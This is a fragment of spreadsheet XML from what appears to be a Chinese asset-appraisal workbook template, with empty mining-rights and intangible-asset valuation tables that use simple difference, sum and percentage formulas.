      <c r="C10" s="380" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="578" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="380" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555">
        <f>L10-K10</f>
        <v/>
      </c>
      <c r="N10" s="615">
        <f>IF(K10=0,"",M10/K10*100)</f>
        <v/>
      </c>
      <c r="O10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="380" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="578" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="380" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555">
        <f>L11-K11</f>
        <v/>
      </c>
      <c r="N11" s="615">
        <f>IF(K11=0,"",M11/K11*100)</f>
        <v/>
      </c>
      <c r="O11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="380" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="578" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="380" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555">
        <f>L12-K12</f>
        <v/>
      </c>
      <c r="N12" s="615">
        <f>IF(K12=0,"",M12/K12*100)</f>
        <v/>
      </c>
      <c r="O12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="380" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="578" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="380" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555">
        <f>L13-K13</f>
        <v/>
      </c>
      <c r="N13" s="615">
        <f>IF(K13=0,"",M13/K13*100)</f>
        <v/>
      </c>
      <c r="O13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="380" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="578" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="380" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555">
        <f>L14-K14</f>
        <v/>
      </c>
      <c r="N14" s="615">
        <f>IF(K14=0,"",M14/K14*100)</f>
        <v/>
      </c>
      <c r="O14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="380" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="578" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="380" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555">
        <f>L15-K15</f>
        <v/>
      </c>
      <c r="N15" s="615">
        <f>IF(K15=0,"",M15/K15*100)</f>
        <v/>
      </c>
      <c r="O15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="380" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="578" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="380" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555">
        <f>L16-K16</f>
        <v/>
      </c>
      <c r="N16" s="615">
        <f>IF(K16=0,"",M16/K16*100)</f>
        <v/>
      </c>
      <c r="O16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="380" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="578" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="380" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555">
        <f>L17-K17</f>
        <v/>
      </c>
      <c r="N17" s="615">
        <f>IF(K17=0,"",M17/K17*100)</f>
        <v/>
      </c>
      <c r="O17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="380" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="578" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="380" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555">
        <f>L18-K18</f>
        <v/>
      </c>
      <c r="N18" s="615">
        <f>IF(K18=0,"",M18/K18*100)</f>
        <v/>
      </c>
      <c r="O18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="380" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="578" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="380" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555">
        <f>L19-K19</f>
        <v/>
      </c>
      <c r="N19" s="615">
        <f>IF(K19=0,"",M19/K19*100)</f>
        <v/>
      </c>
      <c r="O19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="380" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="578" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="380" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555">
        <f>L20-K20</f>
        <v/>
      </c>
      <c r="N20" s="615">
        <f>IF(K20=0,"",M20/K20*100)</f>
        <v/>
      </c>
      <c r="O20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="578" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="380" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555">
        <f>L21-K21</f>
        <v/>
      </c>
      <c r="N21" s="615">
        <f>IF(K21=0,"",M21/K21*100)</f>
        <v/>
      </c>
      <c r="O21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="578" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="380" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555">
        <f>L22-K22</f>
        <v/>
      </c>
      <c r="N22" s="615">
        <f>IF(K22=0,"",M22/K22*100)</f>
        <v/>
      </c>
      <c r="O22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="578" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="380" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555">
        <f>L23-K23</f>
        <v/>
      </c>
      <c r="N23" s="615">
        <f>IF(K23=0,"",M23/K23*100)</f>
        <v/>
      </c>
      <c r="O23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="380" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="578" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="380" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="555">
        <f>L24-K24</f>
        <v/>
      </c>
      <c r="N24" s="615">
        <f>IF(K24=0,"",M24/K24*100)</f>
        <v/>
      </c>
      <c r="O24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="380" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="578" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="380" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555">
        <f>L25-K25</f>
        <v/>
      </c>
      <c r="N25" s="615">
        <f>IF(K25=0,"",M25/K25*100)</f>
        <v/>
      </c>
      <c r="O25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="380" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="578" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="380" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="555">
        <f>L26-K26</f>
        <v/>
      </c>
      <c r="N26" s="615">
        <f>IF(K26=0,"",M26/K26*100)</f>
        <v/>
      </c>
      <c r="O26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="380" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="578" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="380" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555" t="n"/>
      <c r="M27" s="555">
        <f>L27-K27</f>
        <v/>
      </c>
      <c r="N27" s="615">
        <f>IF(K27=0,"",M27/K27*100)</f>
        <v/>
      </c>
      <c r="O27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B28" s="284" t="inlineStr">
        <is>
          <t>合      计</t>
        </is>
      </c>
      <c r="C28" s="593" t="n"/>
      <c r="D28" s="567" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="578" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="380" t="n"/>
      <c r="J28" s="555">
        <f>SUM(J6:J27)</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>SUM(K6:K27)</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>SUM(L6:L27)</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>L28-K28</f>
        <v/>
      </c>
      <c r="N28" s="615">
        <f>IF(K28=0,"",M28/K28*100)</f>
        <v/>
      </c>
      <c r="O28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B29" s="323" t="inlineStr">
        <is>
          <t>减：矿业权减值准备</t>
        </is>
      </c>
      <c r="C29" s="593" t="n"/>
      <c r="D29" s="567" t="n"/>
      <c r="E29" s="380" t="n"/>
      <c r="F29" s="578" t="n"/>
      <c r="G29" s="380" t="n"/>
      <c r="H29" s="380" t="n"/>
      <c r="I29" s="380" t="n"/>
      <c r="J29" s="555" t="n"/>
      <c r="K29" s="555" t="n"/>
      <c r="L29" s="555" t="n"/>
      <c r="M29" s="555">
        <f>L29-K29</f>
        <v/>
      </c>
      <c r="N29" s="615">
        <f>IF(K29=0,"",M29/K29*100)</f>
        <v/>
      </c>
      <c r="O29" s="383" t="n"/>
    </row>
    <row r="30" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A30" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B30" s="114" t="inlineStr">
        <is>
          <t>合         计</t>
        </is>
      </c>
      <c r="C30" s="593" t="n"/>
      <c r="D30" s="593" t="n"/>
      <c r="E30" s="380" t="n"/>
      <c r="F30" s="115" t="n"/>
      <c r="G30" s="380" t="n"/>
      <c r="H30" s="380" t="n"/>
      <c r="I30" s="380" t="n"/>
      <c r="J30" s="555">
        <f>J28-J29</f>
        <v/>
      </c>
      <c r="K30" s="555">
        <f>K28-K29</f>
        <v/>
      </c>
      <c r="L30" s="555">
        <f>L28-L29</f>
        <v/>
      </c>
      <c r="M30" s="555">
        <f>L30-K30</f>
        <v/>
      </c>
      <c r="N30" s="615">
        <f>IF(K30=0,"",M30/K30*100)</f>
        <v/>
      </c>
      <c r="O30" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="7">
    <mergeCell ref="B28:D28"/>
    <mergeCell ref="B1:O1"/>
    <mergeCell ref="N3:O3"/>
    <mergeCell ref="B4:E4"/>
    <mergeCell ref="B2:O2"/>
    <mergeCell ref="B30:D30"/>
    <mergeCell ref="B29:D29"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:O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 codeName="Sheet73">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L30"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A24"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="17.8333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.3333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="10"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col width="9.16666666666667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无形资产—其他无形资产评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" customFormat="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" customForma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373" t="n"/>
      <c r="L3" s="402" t="inlineStr">
        <is>
          <t>表4-13-3</t>
        </is>
      </c>
    </row>
    <row r="4" customForma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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="30" customFormat="1" customHeight="1" s="160">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>无形资产名称和内容</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>取得日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>法定/预计使用年限</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>原始入账价值</t>
        </is>
      </c>
      <c r="G5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>尚可使用年限</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="L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78" t="n"/>
      <c r="E6" s="380" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555">
        <f>I6-G6</f>
        <v/>
      </c>
      <c r="K6" s="555">
        <f>IF(G6=0,"",J6/G6*100)</f>
        <v/>
      </c>
      <c r="L6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="552" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555">
        <f>I7-G7</f>
        <v/>
      </c>
      <c r="K7" s="555">
        <f>IF(G7=0,"",J7/G7*100)</f>
        <v/>
      </c>
      <c r="L7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="552" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555">
        <f>I8-G8</f>
        <v/>
      </c>
      <c r="K8" s="555">
        <f>IF(G8=0,"",J8/G8*100)</f>
        <v/>
      </c>
      <c r="L8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="552" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555">
        <f>I9-G9</f>
        <v/>
      </c>
      <c r="K9" s="555">
        <f>IF(G9=0,"",J9/G9*100)</f>
        <v/>
      </c>
      <c r="L9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="552" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555">
        <f>I10-G10</f>
        <v/>
      </c>
      <c r="K10" s="555">
        <f>IF(G10=0,"",J10/G10*100)</f>
        <v/>
      </c>
      <c r="L10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="552" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555">
        <f>I11-G11</f>
        <v/>
      </c>
      <c r="K11" s="555">
        <f>IF(G11=0,"",J11/G11*100)</f>
        <v/>
      </c>
      <c r="L11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="552" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555">
        <f>I12-G12</f>
        <v/>
      </c>
      <c r="K12" s="555">
        <f>IF(G12=0,"",J12/G12*100)</f>
        <v/>
      </c>
      <c r="L12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="552" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555">
        <f>I13-G13</f>
        <v/>
      </c>
      <c r="K13" s="555">
        <f>IF(G13=0,"",J13/G13*100)</f>
        <v/>
      </c>
      <c r="L13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="552" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555">
        <f>I14-G14</f>
        <v/>
      </c>
      <c r="K14" s="555">
        <f>IF(G14=0,"",J14/G14*100)</f>
        <v/>
      </c>
      <c r="L14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="552" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555">
        <f>I15-G15</f>
        <v/>
      </c>
      <c r="K15" s="555">
        <f>IF(G15=0,"",J15/G15*100)</f>
        <v/>
      </c>
      <c r="L15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="552" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555">
        <f>I16-G16</f>
        <v/>
      </c>
      <c r="K16" s="555">
        <f>IF(G16=0,"",J16/G16*100)</f>
        <v/>
      </c>
      <c r="L16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="552" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555">
        <f>I17-G17</f>
        <v/>
      </c>
      <c r="K17" s="555">
        <f>IF(G17=0,"",J17/G17*100)</f>
        <v/>
      </c>
      <c r="L17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="552" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555">
        <f>I18-G18</f>
        <v/>
      </c>
      <c r="K18" s="555">
        <f>IF(G18=0,"",J18/G18*100)</f>
        <v/>
      </c>
      <c r="L18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="552" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555">
        <f>I19-G19</f>
        <v/>
      </c>
      <c r="K19" s="555">
        <f>IF(G19=0,"",J19/G19*100)</f>
        <v/>
      </c>
      <c r="L19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="552" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555">
        <f>I20-G20</f>
        <v/>
      </c>
      <c r="K20" s="555">
        <f>IF(G20=0,"",J20/G20*100)</f>
        <v/>
      </c>
      <c r="L20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="552" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555">
        <f>I21-G21</f>
        <v/>
      </c>
      <c r="K21" s="555">
        <f>IF(G21=0,"",J21/G21*100)</f>
        <v/>
      </c>
      <c r="L21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="552" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555">
        <f>I22-G22</f>
        <v/>
      </c>
      <c r="K22" s="555">
        <f>IF(G22=0,"",J22/G22*100)</f>
        <v/>
      </c>
      <c r="L22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
